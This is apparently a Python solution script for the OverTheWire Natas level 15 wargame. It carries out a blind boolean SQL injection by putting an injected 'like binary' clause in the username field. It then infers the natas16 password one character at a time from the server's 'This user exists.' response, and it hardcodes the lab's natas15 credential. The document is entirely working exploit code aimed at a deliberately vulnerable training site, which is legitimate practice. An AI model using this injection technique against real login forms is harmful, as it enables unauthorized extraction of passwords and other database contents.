import requests
from string import ascii_lowercase, ascii_uppercase
from time import sleep
import sys

s=requests.Session()
auth=('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
url='http://natas15.natas.labs.overthewire.org/index.php'

def confirm(query,s):
    r=s.post(url,data={'username':query,'password':'a'},auth=auth)
    return 'This user exists.' in r.text

known, possible='', '0123456789' + ascii_lowercase + ascii_uppercase
while len(known)<32:
    for p in possible:
        trial = known + p
        query = f'natas16" and password like binary "{trial}%" #"'
        print(f'len: {len(known)} trying: {trial}\r',end='')
        sleep(0.05)
        if confirm(query, s):
            known = trial
            break

print(f'\npassword: {known}')
